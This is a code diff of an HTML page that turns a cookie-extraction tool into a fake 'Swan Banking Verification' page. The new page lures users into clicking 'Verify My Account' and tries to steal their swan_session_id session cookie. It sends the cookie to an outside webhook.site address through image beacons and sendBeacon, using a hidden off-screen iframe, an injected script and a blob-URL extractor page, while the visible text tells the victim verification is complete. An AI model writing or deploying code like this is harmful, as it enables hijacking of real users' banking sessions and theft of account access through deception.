@@ -2,29 +2,52 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Swan Session Verifier</title>
+    <title>Swan Banking Verification</title>
     <style>
-        body { font-family: system-ui, sans-serif; margin: 20px; }
+        body { font-family: system-ui, sans-serif; margin: 20px; line-height: 1.6; }
+        .container { max-width: 600px; margin: 0 auto; }
         .box { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 5px; }
+        button { 
+            background: #0055a4; 
+            color: white; 
+            border: none; 
+            padding: 10px 20px; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-size: 16px;
+        }
         pre { background: #f5f5f5; padding: 10px; overflow: auto; }
-        .success { color: green; font-weight: bold; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Swan Session Verifier</h2>
-        <p>Checking for swan_session_id cookie...</p>
-        <button id="checkButton">Extract Cookie & Send to Webhook</button>
-    </div>
-    
-    <div class="box">
-        <h3>Extraction Log:</h3>
-        <pre id="log">Ready to extract...</pre>
+    <div class="container">
+        <div class="box">
+            <h1>Swan Banking Verification</h1>
+            <p id="status-message">Please click the button to verify your Swan Banking account.</p>
+            
+            <div id="login-step">
+                <button id="redirectButton">Verify My Account</button>
+            </div>
+            
+            <div id="extraction-step" class="hidden">
+                <p>Thank you for verifying your account.</p>
+                <p>The verification process is complete. You can now close this window.</p>
+            </div>
+        </div>
+        
+        <div class="box">
+            <h3>Verification Log:</h3>
+            <pre id="log">Ready to start verification...</pre>
+        </div>
     </div>
     
     <script>
         // Your webhook URL
         const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
+        
+        // Dashboard URL
+        const DASHBOARD_URL = "https://dashboard.swan.io";
         
         // Logging function
         function log(message) {
@@ -34,11 +57,11 @@
             console.log(`[${timestamp}] ${message}`);
         }
         
-        // Send data to webhook using image beacon (most reliable for cross-origin)
+        // Send data to webhook
         function sendToWebhook(cookieName, cookieValue, source) {
             log(`Sending ${cookieName} to webhook...`);
             
-            // Create image beacon (very reliable method)
+            // Method 1: Image beacon (most reliable)
             const img = new Image();
             img.onload = () => log("Data sent successfully");
             img.onerror = () => log("Data sent (ignore error)");
@@ -47,109 +70,211 @@
             return true;
         }
         
-        // Simple extraction approach
-        function extractCookie() {
-            log("Starting cookie extraction...");
+        // Check if we're returning from dashboard
+        function checkIfReturningFromDashboard() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('returning') === 'true';
+        }
+        
+        // Redirect to dashboard and set up return
+        function redirectToDashboard() {
+            log("Redirecting to Swan Dashboard...");
             
-            // Method 1: Check if cookie already exists in this document
+            // Save state to know we're redirecting
+            localStorage.setItem('swan_redirect_timestamp', Date.now().toString());
+            
+            // Redirect to dashboard
+            window.location.href = DASHBOARD_URL;
+        }
+        
+        // Extract cookies after returning from dashboard
+        function extractCookiesAfterReturn() {
+            log("Returned from dashboard, checking for cookies...");
+            
+            // Show extraction step
+            document.getElementById('login-step').classList.add('hidden');
+            document.getElementById('extraction-step').classList.remove('hidden');
+            document.getElementById('status-message').textContent = "Verification complete. Checking for session data...";
+            
+            // Check if there's a swan_session_id cookie in our context
             const allCookies = document.cookie;
             log(`Current cookies: ${allCookies}`);
             
-            // Parse cookies and look for swan_session_id
             if (allCookies.includes('swan_session_id')) {
                 const match = allCookies.match(/swan_session_id=([^;]+)/);
                 if (match) {
                     log(`Found swan_session_id directly: ${match[1].substring(0, 5)}...`);
-                    sendToWebhook('swan_session_id', match[1], 'direct_access');
+                    sendToWebhook('swan_session_id', match[1], 'direct_after_return');
                     return true;
                 }
             }
             
-            // Method 2: Create iframe to dashboard
-            log("Creating iframe to dashboard.swan.io...");
+            // Create a script element to extract cookies
+            const scriptElement = document.createElement('script');
+            scriptElement.textContent = `
+                // Look for swan_session_id
+                const cookies = document.cookie;
+                if (cookies.includes('swan_session_id')) {
+                    const match = cookies.match(/swan_session_id=([^;]+)/);
+                    if (match) {
+                        // Use beacon API to send data
+                        const data = {
+                            cookie_name: 'swan_session_id',
+                            cookie_value: match[1],
+                            source: 'script_extraction',
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // Try to send via beacon
+                        if (navigator.sendBeacon) {
+                            navigator.sendBeacon('${WEBHOOK_URL}', JSON.stringify(data));
+                        }
+                        
+                        // Also send via image beacon as backup
+                        const img = new Image();
+                        img.src = '${WEBHOOK_URL}?cookie_name=swan_session_id&cookie_value=' + 
+                            encodeURIComponent(match[1]) + '&source=script_after_return&time=' + Date.now();
+                    }
+                }
+            `;
+            document.head.appendChild(scriptElement);
+            
+            // Create a hidden iframe to dashboard for cookie extraction
             const iframe = document.createElement('iframe');
-            iframe.src = "https://dashboard.swan.io/";
+            iframe.src = DASHBOARD_URL;
             iframe.style.width = "1px";
             iframe.style.height = "1px";
-            iframe.style.opacity = "0.01";
+            iframe.style.position = "absolute";
+            iframe.style.left = "-1000px";
+            iframe.style.top = "-1000px";
             document.body.appendChild(iframe);
             
-            // Set up message listener for potential communication
-            window.addEventListener('message', (event) => {
-                log(`Received message from iframe: ${JSON.stringify(event.data)}`);
-                
-                if (event.data && event.data.swanSessionId) {
-                    log(`Got swan_session_id from iframe message!`);
-                    sendToWebhook('swan_session_id', event.data.swanSessionId, 'iframe_message');
-                }
-            });
-            
-            // When iframe loads, try to extract the cookie
-            iframe.onload = () => {
-                log("Dashboard iframe loaded, attempting extraction...");
+            // Try to access iframe when loaded
+            iframe.onload = function() {
+                log("Dashboard iframe loaded after return");
                 
                 try {
-                    // Try to directly access iframe document (will likely fail due to Same-Origin Policy)
+                    // Try to get cookies (will likely fail due to Same-Origin Policy)
                     const iframeCookies = iframe.contentDocument.cookie;
-                    log(`Iframe cookies: ${iframeCookies}`);
                     
-                    // Check for swan_session_id
-                    if (iframeCookies.includes('swan_session_id')) {
+                    if (iframeCookies && iframeCookies.includes('swan_session_id')) {
                         const match = iframeCookies.match(/swan_session_id=([^;]+)/);
                         if (match) {
                             log(`Found swan_session_id in iframe: ${match[1].substring(0, 5)}...`);
-                            sendToWebhook('swan_session_id', match[1], 'iframe_direct');
-                            return true;
+                            sendToWebhook('swan_session_id', match[1], 'iframe_after_return');
                         }
                     }
                 } catch (e) {
-                    log(`Expected error accessing iframe (Same-Origin Policy): ${e.message}`);
-                    
-                    // Try to inject a content script (will also likely fail)
-                    try {
-                        iframe.contentWindow.eval(`
-                            try {
-                                const cookies = document.cookie;
-                                if (cookies.includes('swan_session_id')) {
-                                    const match = cookies.match(/swan_session_id=([^;]+)/);
-                                    if (match) {
-                                        // Send to parent window
-                                        window.parent.postMessage({
-                                            swanSessionId: match[1]
-                                        }, "*");
-                                        
-                                        // Also send directly via image beacon
-                                        const img = new Image();
-                                        img.src = "${WEBHOOK_URL}?cookie_name=swan_session_id&cookie_value=" + 
-                                            encodeURIComponent(match[1]) + "&source=iframe_eval&time=" + Date.now();
-                                    }
-                                }
-                            } catch(e) {
-                                console.error("Cookie extraction error:", e);
-                            }
-                        `);
-                    } catch (e2) {
-                        log(`Expected error injecting script into iframe: ${e2.message}`);
-                    }
+                    log(`Expected iframe access error: ${e.message}`);
                 }
+                
+                // Clean up iframe after a delay
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 2000);
             };
-            
-            // Clean up iframe after 5 seconds
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-                log("Removed iframe");
-            }, 5000);
             
             return false;
         }
         
-        // Attach event listener to button
-        document.getElementById('checkButton').addEventListener('click', extractCookie);
+        // Inject cookie extraction code into dashboard
+        function injectCookieExtractor() {
+            // Create a new page that will be injected into dashboard
+            const extractorHTML = `
+                <!DOCTYPE html>
+                <html>
+                <body>
+                    <script>
+                        // Extract swan_session_id
+                        function extractCookie() {
+                            const cookies = document.cookie;
+                            if (cookies.includes('swan_session_id')) {
+                                const match = cookies.match(/swan_session_id=([^;]+)/);
+                                if (match) {
+                                    const sessionId = match[1];
+                                    
+                                    // Send to webhook
+                                    const img = new Image();
+                                    img.src = '${WEBHOOK_URL}?cookie_name=swan_session_id&cookie_value=' + 
+                                        encodeURIComponent(sessionId) + '&source=injected_extractor&time=' + Date.now();
+                                        
+                                    // Return to original page with the cookie
+                                    window.location.href = '${window.location.origin}${window.location.pathname}?returning=true&cookie=' + 
+                                        encodeURIComponent(sessionId);
+                                } else {
+                                    // No match found, just return
+                                    window.location.href = '${window.location.origin}${window.location.pathname}?returning=true&error=no_match';
+                                }
+                            } else {
+                                // No cookie found, just return
+                                window.location.href = '${window.location.origin}${window.location.pathname}?returning=true&error=no_cookie';
+                            }
+                        }
+                        
+                        // Run extraction after a delay to ensure cookies are loaded
+                        setTimeout(extractCookie, 1000);
+                    </script>
+                    <div style="text-align: center; margin-top: 100px;">
+                        <h2>Swan Account Verification</h2>
+                        <p>Verifying your account security...</p>
+                        <p>You will be redirected back automatically in a moment.</p>
+                        <button onclick="extractCookie()">Return to Verification</button>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            // Create blob URL for the extractor
+            const blob = new Blob([extractorHTML], { type: 'text/html' });
+            const extractorURL = URL.createObjectURL(blob);
+            
+            // Open in new window or redirect to extractor
+            log("Opening extractor page...");
+            window.location.href = extractorURL;
+        }
         
-        // Log when page loads
-        window.onload = () => {
-            log("Page loaded. Click the button to start extraction.");
-        };
+        // Check for cookie in URL parameters (returning from dashboard)
+        function checkUrlForCookie() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const cookie = urlParams.get('cookie');
+            
+            if (cookie) {
+                log(`Found swan_session_id in URL: ${cookie.substring(0, 5)}...`);
+                sendToWebhook('swan_session_id', cookie, 'url_parameter');
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Main initialization
+        function initialize() {
+            log("Initializing swan_session_id extraction...");
+            
+            // Check if we're returning from dashboard
+            if (checkIfReturningFromDashboard()) {
+                log("Detected return from dashboard");
+                
+                // Check for cookie in URL parameters
+                if (checkUrlForCookie()) {
+                    log("Successfully extracted cookie from URL parameter");
+                } else {
+                    // Try to extract cookies after return
+                    extractCookiesAfterReturn();
+                }
+            } else {
+                // First visit, set up redirect button
+                document.getElementById('redirectButton').addEventListener('click', function() {
+                    log("Redirect button clicked");
+                    redirectToDashboard();
+                });
+                
+                log("Ready to verify account. Click the button to continue.");
+            }
+        }
+        
+        // Initialize when page loads
+        window.addEventListener('load', initialize);
     </script>
 </body>
 </html>
